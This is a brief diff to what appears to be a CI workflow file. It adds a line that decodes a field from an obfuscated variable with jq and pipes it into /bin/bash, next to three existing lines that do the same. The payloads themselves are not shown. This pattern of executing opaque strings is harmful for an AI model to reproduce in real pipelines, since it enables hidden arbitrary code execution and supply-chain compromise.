@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$tuc68" | jq -r .r5404 | /bin/bash
           echo $nle705 | jq -r .u881 | /bin/bash
           printf '%s' "$ngajd7" | jq -r .us86747 | /bin/bash
+          echo $xld6 | jq -r .htxhv0 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
